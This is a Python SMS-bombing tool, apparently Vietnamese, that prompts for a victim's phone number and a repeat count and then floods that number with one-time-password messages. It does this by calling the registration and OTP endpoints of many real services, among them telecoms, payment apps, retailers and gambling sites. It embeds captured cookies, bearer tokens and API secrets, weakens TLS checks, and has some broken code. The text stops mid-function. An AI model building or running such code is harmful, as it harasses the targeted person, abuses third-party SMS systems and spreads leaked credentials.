import requests,os,time,re,json,uuid,random,sys, ssl, inspect, pytz, urllib3
from datetime import datetime
from urllib3.poolmanager import PoolManager
from requests.adapters import HTTPAdapter
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#thời gian hiện tại
now = datetime.now(pytz.timezone("Asia/Ho_Chi_Minh"))
time_str = now.strftime("%Y-%m-%d %H:%M:%S")

#kiều hoàng nam
ban = """\033[1;32m
					┓┏┓┳┏┓┳┳  ┓┏┏┓┏┓┳┓┏┓  ┳┓┏┓┳┳┓
					┃┫ ┃┣ ┃┃  ┣┫┃┃┣┫┃┃┃┓  ┃┃┣┫┃┃┃
					┛┗┛┻┗┛┗┛  ┛┗┗┛┛┗┛┗┗┛  ┛┗┛┗┛ ┗                        
						KIỀU HOÀNG NAM										
					     🐖 SPAM SMS V1.0 🐖
\033[1;36m					----------------------------       
\033[1;34m   	 				🐼 FACEBOOK: 
\033[1;34m	 				🦊 ZALO: 0987654321
\033[1;34m	 				🪿 INSTAGRAM: 
\033[1;34m	 				🦈 TIKTOK: 						
\033[1;36m					----------------------------
"""
for h in ban:
	sys.stdout.write(h)
	sys.stdout.flush()
	time.sleep(0.001)
#nhìn gì vậy
sdt = input("\033[1;35m▶ NHẬP SỐ CẦM SPAM DCU CMAY: ")
while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
	print("DCM SAI ĐỊNH DẠNG RỒI")
	sdt = input("NHẬP LẠI ĐI DCU: ")
count = int(input("\033[0;31m▶ SPAM BAO NHIÊU LẦN: "))
os.system("cls")

if sdt == "0347614498":
	print("DÙNG TOOL TAO ĐEM ĐI SPAM TAO ĐÂU CÓ DỄ ?")
	quit()

#cấu hình màu....
class SSLAdapter(HTTPAdapter):
	def init_poolmanager(self, *args, **kwargs):
		ctx = ssl.create_default_context()
		ctx.set_ciphers("DEFAULT@SECLEVEL=1")  # <== Cho phép DH key nhỏ
		kwargs['ssl_context'] = ctx
		return super().init_poolmanager(*args, **kwargs)

session = requests.Session()
session.mount("https://", SSLAdapter())
threading = ThreadPoolExecutor(max_workers=int(10000000))
# 360tv ,winmart,vion,poyeye,alfresco,loship
def vieon(sdt):
	headers = {
		'accept': 'application/json, text/plain, */*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDgyNzIwODUsImp0aSI6IjRlODY2ZjBjZGFjOWI3MmRmZTFkZTA2ZTVmMGM4Zjc2IiwiYXVkIjoiIiwiaWF0IjoxNzQ4MDk5Mjg1LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTc0ODA5OTI4NCwic3ViIjoiYW5vbnltb3VzXzdlY2Q5YzZhYjZiZDE2YmEzMGQ0ZWMxNzBiZWFmMzBjLWFkYWYwNjUwYTgwMzk3NmYzNTI2NWRhMTRmY2NiNDI2LTE3NDgwOTkyODUiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2VjZDljNmFiNmJkMTZiYTMwZDRlYzE3MGJlYWYzMGMtYWRhZjA2NTBhODAzOTc2ZjM1MjY1ZGExNGZjY2I0MjYtMTc0ODA5OTI4NSIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDYuMDsgTmV4dXMgNSBCdWlsZC9NUkE1OE4pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzYuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.mRNkW9b_skkI6JYfCVAoj7B7LstyQ0E_0P4jnt5GY-8',
		'content-type': 'application/json',
		'origin': 'https://vieon.vn',
		'priority': 'u=1, i',
		'referer': 'https://vieon.vn/auth/?destination=/?srsltid=AfmBOopdZYv_U2sYd3ed1KkwGP_2i1nOGzd7ZAn7DaGrXaOWGtkLD3Zx&page=/',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
	}

	params = {
		'platform': 'web',
		'ui': '012021',
	}

	json_data = {
		'username': f'{sdt}',
		'country_code': 'VN',
		'model': 'Windows 10',
		'device_id': '7ecd9c6ab6bd16ba30d4ec170beaf30c',
		'device_name': 'Chrome/136',
		'device_type': 'desktop',
		'platform': 'web',
		'ui': '012021',
	}

	response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')

def best_inc(sdt):
	headers = {
		'Host': 'v9-cc.800best.com',
		'Connection': 'keep-alive',
		# 'Content-Length': '53',
		'x-timezone-offset': '7',
		'x-auth-type': 'web-app',
		'x-nat': 'vi-VN',
		'x-lan': 'VI',
		'authorization': 'null',
		'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
		'content-type': 'application/json',
		'accept': 'application/json',
		'lang-type': 'vi-VN',
		'Origin': 'https://best-inc.vn',
		'X-Requested-With': 'mark.via.gp',
		'Sec-Fetch-Site': 'cross-site',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Dest': 'empty',
		'Referer': 'https://best-inc.vn/',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
	}
	data = '{"phoneNumber":"sdt","verificationCodeType":1}'.replace("sdt",sdt)
	response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode',data=data,headers=headers).text
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def pizzacompany(sdt):
	cookies = {
		'_gcl_au': '1.1.607819339.1691276885',
		'_ga': 'GA1.2.453948248.1691276886',
		'_gid': 'GA1.2.698696022.1691276886',
		'_tt_enable_cookie': '1',
		'_ttp': 'bwCYo8Ir1_CxxhKbysJDt5JtlQ7',
		'_fbp': 'fb.1.1691276888170.1960321660',
		'.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8',
		'.Nop.Customer': 'ccaefc12-aefb-4b4d-8b87-776f2ee9af1f',
		'.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
	}
	headers = {
		'Host': 'thepizzacompany.vn',
		# 'content-length': '199',
		'accept': '*/*',
		'x-requested-with': 'XMLHttpRequest',
		'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
		'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'origin': 'https://thepizzacompany.vn',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-mode': 'cors',
		'sec-fetch-dest': 'empty',
		'referer': 'https://thepizzacompany.vn/Otp',
		# 'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
		# 'cookie': '_gcl_au=1.1.607819339.1691276885; _ga=GA1.2.453948248.1691276886; _gid=GA1.2.698696022.1691276886; _tt_enable_cookie=1; _ttp=bwCYo8Ir1_CxxhKbysJDt5JtlQ7; _fbp=fb.1.1691276888170.1960321660; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8; .Nop.Customer=ccaefc12-aefb-4b4d-8b87-776f2ee9af1f; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
	}
	data = {
		'phone': f'{sdt}',
		'__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfbQwvToQkkGuj4TN2sRcEQ1WYLq8FZcCaAf8P9JHU46UhpBthj5H4JH3oJjwi0hx_zMAPEMRGPK6X6QnCzHwfMW_RhUnFUsBEDrss3f32LBDTUcbq9dohqqQZr2VFE9Ns',
	}
	response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data).json()
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')

def tv360(phone):
	cookies = {
		'device-id': 's%3Awap_bd36142f-3f9e-48b7-8702-eaf24eee85b2.E7UHat%2BZVBxnrbp3QBamQj%2FOFe%2FIWM9r5jvcJXWNJTQ',
		'shared-device-id': 'wap_bd36142f-3f9e-48b7-8702-eaf24eee85b2',
		'screen-size': 's%3A958x1108.bDeJQcQtOt2QZaYNOtI7iRq2FRFZKUOf6pU9c22AnBc',
		'_gid': 'GA1.2.2130656950.1748097972',
		'_gcl_au': '1.1.212507564.1748097972',
		'img-ext': 'avif',
		'_gat_UA-180935206-1': '1',
		'_ga': 'GA1.1.326740773.1748097972',
		'G_ENABLED_IDPS': 'google',
		'_ga_D7L53J0JMS': 'GS2.1.s1748148810$o2$g1$t1748148834$j36$l0$h0$d5NXBFeEoRqtVuyaiUato3GCbCX3_0VNyMw',
		'_ga_E5YP28Y8EF': 'GS2.1.s1748148810$o2$g1$t1748148834$j0$l0$h0',
	}

	headers = {
		'Accept': 'application/json, text/plain, */*',
		'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'Connection': 'keep-alive',
		'Content-Type': 'application/json',
		'Origin': 'http://tv360.vn',
		'Referer': 'http://tv360.vn/login?r=http%3A%2F%2Ftv360.vn%2F',
		'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
		'startTime': '1748148834187',
		'tz': 'Asia/Saigon',
		# 'Cookie': 'device-id=s%3Awap_bd36142f-3f9e-48b7-8702-eaf24eee85b2.E7UHat%2BZVBxnrbp3QBamQj%2FOFe%2FIWM9r5jvcJXWNJTQ; shared-device-id=wap_bd36142f-3f9e-48b7-8702-eaf24eee85b2; screen-size=s%3A958x1108.bDeJQcQtOt2QZaYNOtI7iRq2FRFZKUOf6pU9c22AnBc; _gid=GA1.2.2130656950.1748097972; _gcl_au=1.1.212507564.1748097972; img-ext=avif; _gat_UA-180935206-1=1; _ga=GA1.1.326740773.1748097972; G_ENABLED_IDPS=google; _ga_D7L53J0JMS=GS2.1.s1748148810$o2$g1$t1748148834$j36$l0$h0$d5NXBFeEoRqtVuyaiUato3GCbCX3_0VNyMw; _ga_E5YP28Y8EF=GS2.1.s1748148810$o2$g1$t1748148834$j0$l0$h0',
	}

	json_data = {
		'msisdn': phone,
	}

	response = requests.post(
		'http://tv360.vn/public/v1/auth/get-otp-login',
		cookies=cookies,
		headers=headers,
		json=json_data,
		verify=False,
	)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
	if False in respone.status_code:
		print("lỗi" f'{response.status_code}')
def vtmoney(phone):
	cookies = {
		'_cfuvid': 'IbrAhg9ruybk5tvcyo2YDibVieT0lAMzt5HRVyDkd8U-1748153577558-0.0.1.1-604800000',
	}
	headers = {
		'host': 'api8.viettelpay.vn',
		'content-type': 'application/json',
		'accept': '*/*',
		'app-version': '8.8.28',
		'product': 'VIETTELPAY',
		'type-os': 'ios',
		'accept-encoding': 'gzip;q=1.0, compress;q=0.5',
		'accept-language': 'vi',
		'imei': '70B0EA3D-7FC0-45BA-8303-E83D802C004B',
		'device-name': 'iPhone',
		'user-agent': 'Viettel Money/8.8.28 (com.viettel.viettelpay; build:2; iOS 18.3.2) Alamofire/4.9.1',
		'content-length': '73',
		'os-version': '18.3.2',
		#'cookie': '_cfuvid=IbrAhg9ruybk5tvcyo2YDibVieT0lAMzt5HRVyDkd8U-1748153577558-0.0.1.1-604800000',
		'authority-party': 'APP',
	}

	json_data = {
		"identityType": "msisdn",
		"type": "REGISTER",
		"identityValue": phone,
	}

	response = requests.post('https://api8.viettelpay.vn/customer/v2/accounts/register', cookies=cookies, headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def vtpost(phone):
	headers = {
		'host': 'otp-verify.okd.viettelpost.vn',
		'accept': 'application/json, text/plain, */*',
		'content-type': 'application/json;charset=utf-8',
		'accept-encoding': 'gzip, deflate, br',
		'user-agent': 'ViettelPost/2 CFNetwork/3826.400.120 Darwin/24.3.0',
		'content-length': '84',
		'accept-language': 'vi-VN,vi;q=0.9',
	}
	json_data = {
		"account": phone,
		"function": "SSO_REGISTER",
		"type": "PHONE",
		"otpType": "NUMBER",
	}
	response = requests.post('https://otp-verify.okd.viettelpost.vn/api/otp/sendOTP', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def mobifone(phone):
	headers = {
		'Host': 'api.mobifone.vn',
		'uuid': 'E1EC4517-6B6B-4521-BFAF-9EFA9CE86422',
		'Accept': '*/*',
		'langcode': 'vi',
		'timeStamp': '1748156139.314017',
		'appversion': '4.17.4',
		'Accept-Encoding':'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
		'Accept-Language': 'vi-VN;q=1.0',
		'osinfo': 'iOS, 18.3.2',
		'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
		'deviceinfo': 'iPhone 11',
		'User-Agent': 'MyMobiFone/4.17.4 (vms.com.MyMobifone; build:8; iOS 18.3.2) Alamofire/5.9.1',
		'Content-Length': '15',
		'Connection': 'keep-alive',
		'apisecret': 'UEJ34gtH345DFG45G3ht1',
	}
	data = {
		'phone': phone,
	}
	response = requests.post('https://api.mobifone.vn/api/auth/getloginotp', headers=headers, data=data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')

class SSLAdapter(HTTPAdapter):
	def init_poolmanager(self, *args, **kwargs):
		ctx = ssl.create_default_context()
		ctx.set_ciphers("DEFAULT@SECLEVEL=1")  # <== Cho phép DH key nhỏ
		kwargs['ssl_context'] = ctx
		return super().init_poolmanager(*args, **kwargs)

session = requests.Session()
session.mount("https://", SSLAdapter())

def myvnpt(phone):
	headers = {
		'Host': 'api-myvnpt.vnpt.vn',
		'Content-Type': 'application/json',
		'Accept': '*/*',
		'Connection': 'keep-alive',
		'Language': 'vi_VN',
		'Content-Length': '67',
		'User-Agent':'My VNPT/5.1.5 (com.vnp.myvinaphone; build:2025051802; iOS 18.3.2) Alamofire/5.10.2',
		'Accept-Language': 'vi-VN;q=1.0',
		'Accept-Encoding': 'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
		'Device-Info': '6C043B99-B731-4EEC-82E3-04E3D708CC42|||iOS||5.1.5-2025051802|iPhone 11|18.3.2|',
	}
	json_data = {
		"otp_service":"authen_msisdn",
		"msisdn":phone,
		"tinh_id":""
	}
	response = session.post('https://api-myvnpt.vnpt.vn/mapi_v2/services/otp_send', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def chotot(phone):
	cookies = {
		'_cfuvid':'QPSbcekUnptfoxekeMrE.8_QqQpa6TY6.bC.PwL.WFI-1748261723349-0.0.1.1-604800000',
	}
	headers = {
		'host': 'gateway.chotot.com',
		'content-type': 'application/json',
		'fingerprint': '3855FD92-0C1D-4CD9-98D6-7FEED088CC41',
		'accept': '*/*',
		'ct-fingerprint': '3855FD92-0C1D-4CD9-98D6-7FEED088CC41',
		'ct-platform': 'ios',
		'accept-language': 'vi-VN;q=1.0',
		'accept-encoding': 'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
		'ct-idfp': 'ea26825a-e91d-5a1d-a29b-c2ea6c40151e',
		'ct-app-version': '4.84.0',
		'user-agent': 'ChoTot/4.84.0 (vn.chotot.iosapp; build:2505211426; iOS 18.3.2) Alamofire/5.9.1',
		'content-length': '37',
		#'cookie': '_cfuvid=QPSbcekUnptfoxekeMrE.8_QqQpa6TY6.bC.PwL.WFI-1748261723349-0.0.1.1-604800000',
	}
	json_data =	{
		"phone": phone,
		"app_id":"ios"

	}
	
	response = requests.post('https://gateway.chotot.com/v2/public/auth/send_otp_verify', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
	#không mã
def bhx(phone):
	headers = {
		'host': 'apibhx.tgdd.vn',
		'content-type': 'application/json',
		'reversehost': 'http://bhxapi.live',
		'accept': 'application/json',
		'authorization': 'Bearer E976DCB40A1EBFC9BF8597D8D35951D9',
		'appscreen': 'Profile',
		'accept-language': 'vi-VN,vi;q=0.9',
		'accept-encoding': 'gzip, deflate, br',
		'platform': 'ios',
		'deviceid': '9FFC85BF-9173-4C97-837E-B7684816D992',
		'content-length': '141',
		'user-agent': 'iOS||18.3.2||9FFC85BF-9173-4C97-837E-B7684816D992||VersionApp 2.0.18', 
		'xapikey': 'bhx-api-core-2022',
	}
	json_data =	{
		"UserName":phone,
		"DeviceId":"9FFC85BF-9173-4C97-837E-B7684816D992",
		"OS":"ios","Relogin":False,
		"DeviceName":"iPhone 11",
		"isOnlySMS":0
	}
	response = requests.post('https://apibhx.tgdd.vn/User/LoginByNumberPhone', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def viettel(phone):
	cookies = {
		'D1N': '7b9e17f12dca137f1a880e2af6cd3eef',
		'_gcl_au': '1.1.208220017.1748150523',
		'_fbp': 'fb.1.1748150523616.32532520975271478',
		'laravel_session': 'RUF81Shw8kXT6OaPXetZf6ehCU5sHs4BfgMvtbSO',
		'_ga': 'GA1.2.621948631.1748150523',
		'_gid': 'GA1.2.2110971541.1748270629',
		'redirectLogin': 'https://viettel.vn/myviettel',
		'__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1ealoR7ennq1nchDikt86ql0QypswiSUGCDgplVl.1',
		'_ga_Z30HDXVFSV': 'GS2.1.s1748270629$o2$g1$t1748270651$j0$l0$h0',
		'XSRF-TOKEN': 'eyJpdiI6IjkxVmltU0xWcGVzV0JkaTlQN0tjYXc9PSIsInZhbHVlIjoiemhPYzVvVWZjaTdpQTlTOXZMenFkUkVCb0hvM3NZSnNZRGpldTNBbUJqbEF4OEkxMjVmelhmaUN4Y2pnQWEwOSIsIm1hYyI6IjRmYzhiOTM5MWE3OGQ4MjBmODlmY2ZjOGI3ODQ4MzJjODBkMWI5ZDNjMDM3M2NlZGE1NTc1N2IzNmQ2MGZiNWUifQ%3D%3D',
		'_ga_VH8261689Q': 'GS2.1.s1748270629$o2$g1$t1748270976$j6$l0$h0$d0Vv7D8zlRK8nnDS-8CuV40LhSOaocF89YQ',
	}

	headers = {
		'accept': 'application/json, text/plain, */*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json;charset=UTF-8',
		'origin': 'https://viettel.vn',
		'priority': 'u=1, i',
		'referer': 'https://viettel.vn/myviettel',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
		'x-csrf-token': 'pWLE6D0MSH5thBkXsqgrMS1syICTiEMVe15d5b8U',
		'x-requested-with': 'XMLHttpRequest',
		'x-xsrf-token': 'eyJpdiI6IjkxVmltU0xWcGVzV0JkaTlQN0tjYXc9PSIsInZhbHVlIjoiemhPYzVvVWZjaTdpQTlTOXZMenFkUkVCb0hvM3NZSnNZRGpldTNBbUJqbEF4OEkxMjVmelhmaUN4Y2pnQWEwOSIsIm1hYyI6IjRmYzhiOTM5MWE3OGQ4MjBmODlmY2ZjOGI3ODQ4MzJjODBkMWI5ZDNjMDM3M2NlZGE1NTc1N2IzNmQ2MGZiNWUifQ==',
		# 'cookie': 'D1N=7b9e17f12dca137f1a880e2af6cd3eef; _gcl_au=1.1.208220017.1748150523; _fbp=fb.1.1748150523616.32532520975271478; laravel_session=RUF81Shw8kXT6OaPXetZf6ehCU5sHs4BfgMvtbSO; _ga=GA1.2.621948631.1748150523; _gid=GA1.2.2110971541.1748270629; redirectLogin=https://viettel.vn/myviettel; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1ealoR7ennq1nchDikt86ql0QypswiSUGCDgplVl.1; _ga_Z30HDXVFSV=GS2.1.s1748270629$o2$g1$t1748270651$j0$l0$h0; XSRF-TOKEN=eyJpdiI6IjkxVmltU0xWcGVzV0JkaTlQN0tjYXc9PSIsInZhbHVlIjoiemhPYzVvVWZjaTdpQTlTOXZMenFkUkVCb0hvM3NZSnNZRGpldTNBbUJqbEF4OEkxMjVmelhmaUN4Y2pnQWEwOSIsIm1hYyI6IjRmYzhiOTM5MWE3OGQ4MjBmODlmY2ZjOGI3ODQ4MzJjODBkMWI5ZDNjMDM3M2NlZGE1NTc1N2IzNmQ2MGZiNWUifQ%3D%3D; _ga_VH8261689Q=GS2.1.s1748270629$o2$g1$t1748270976$j6$l0$h0$d0Vv7D8zlRK8nnDS-8CuV40LhSOaocF89YQ',
	}

	json_data = {
		'phone': phone,
		'typeCode': 'DI_DONG',
		'actionCode': 'myviettel://login_mobile',
		'type': 'otp_login',
	}

	response = requests.post('https://viettel.vn/api/getOTPLoginCommon', cookies=cookies, headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def sunwin(phone):
	headers = {
		'accept': '*/*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'authorization': '85d840e433c74f39a3d50d0f3e66cba9',
		'origin': 'https://play.sun.win',
		'priority': 'u=1, i',
		'referer': 'https://play.sun.win/',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
	}
	params = {
		'command': 'getOTPCode',
		'type': '1',
		'phone': phone,
	}
	response = requests.get('https://api.azhkthg1.net/paygate', params=params, headers=headers)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
	#khong mã
def hitclb(phone):
	headers = {
		'accept': '*/*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json',
		'origin': 'https://i.hit.club',
		'priority': 'u=1, i',
		'referer': 'https://i.hit.club/',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
		'x-token': 'f4666827199d7dca78ca9be8dea3504d',
	}
	json_data = {
		'phone': phone,
		'app_id': 'bc114103',
		'fg_id': '146fca9965e795f8f787485ecca8c61d',
	}
	response = requests.post('https://pmbodergw.dsrcgoms.net/otp/send', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def go88(phone):
	headers = {
		'accept': '*/*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json',
		'origin': 'https://i.go88.com',
		'priority': 'u=1, i',
		'referer': 'https://i.go88.com/',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
		'x-token': '68f6acc91fc4944effaee89430dd7a52',
	}

	json_data = {
		'phone': phone,
		'app_id': 'go88com',
		'fg_id': 'bf43cf47709fc3c1357f915505275a50',
	}
	response = requests.post('https://pmbodergw.dsrcgoms.net/otp/send', headers=headers, json=json_data)
	func_name = inspect.currentframe().f_code.co_name
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def gemwwin(phone):
	headers = {
		'accept': '*/*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'authorization': 'c61277d65f594e3b8a07a59d090c1197',
		'origin': 'https://play.gem.win',
		'priority': 'u=1, i',
		'referer': 'https://play.gem.win/',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
	}
	params = {
		'command': 'getOTPCode',
		'type': '1',
		'phone': phone,
	}
	response = requests.get('https://api.gmwin.io/paygate', params=params, headers=headers)
	func_name = inspect.currentframe().f_code.co_name
	#không mã
	print(f'|{time_str}| 🐲 |{sdt}| 💮 |{response.status_code}| 🔜 {func_name} SUCCESS')
def b52(phone):
	headers = {
		'accept': '*/*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json',
		'origin': 'https://play.b52.cc',
		'priority': 'u=1, i',
		'referer': 'https://play.b52.cc/',
		'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
